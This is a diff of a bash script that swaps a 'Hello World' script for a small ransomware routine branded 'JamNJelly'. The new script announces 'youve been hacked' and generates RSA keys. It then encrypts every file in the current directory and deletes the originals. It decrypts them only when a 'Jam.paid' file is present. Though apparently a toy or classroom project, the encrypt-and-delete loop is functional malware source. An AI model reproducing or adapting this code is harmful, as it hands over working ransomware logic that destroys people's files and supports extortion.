@@ -1,13 +1,60 @@
 #!/bin/bash
 
-echo Hello World
-path=$(pwd)
-echo $path
+info="[!]"
+inProgress="[-]"
+isFinished="[+]"
+isError="[*]"
+filePrefix="Jelly."
+echo "heheheheh youve been hacked by JamNJelly!"
 
-./keygen
+echo "$inProgress Generating rsa keys"
+rsa/keygen
+mv rsa.priv rsa
+mv rsa.pub rsa
+echo "$isFinished Finished generating rsa keys"
 
-mkdir rsaPrivateKey
-mv rsa.priv rsaPrivateKey
 
+if [ -f "Jam.paid" ]; then
+	echo "$inProgress decrypting files in your directory..."
+	echo "$info Directory: $PWD"
+	numFiles=0
+	for file in * 
+		do
+			if [ "$file" == "rsa" ] ; then
+				continue;
+			elif [ "$file" == "JamNJelly" ] ; then
+				continue;
+			elif [ "$file" == "Jam.paid" ] ; then
+				continue;
+			else
+				numFiles=$((numFiles+1))
+				outfile=${file#*.}
+				echo "$inProgress decrypting $file to $outfile"
+				rsa/decrypt -i $file -o $outfile -n rsa/rsa.priv
+				rm -f $file
+			fi
+		done
+		rm -f "Jam.paid"
 
+else
+	echo "$inProgress encrypting files in your directory..."
+	echo "$info Directory: $PWD"
+	numFiles=0
+	for file in *
+	do
+		if [ "$file" == "rsa" ] ; then
+			continue;
+		elif [ "$file" == "JamNJelly" ] ; then
+			continue;
+		else
+			numFiles=$((numFiles+1))
+			outfile=$filePrefix$file
+			echo "$inProgress encrypting $file into $outfile"
+			rsa/encrypt -i $file -o $outfile -n rsa/rsa.pub
+			rm -f $file
+		fi
+	done
+	echo "$isFinished Finished encrypting files"
+	echo "$info encrypted $numFiles files"
+fi
 
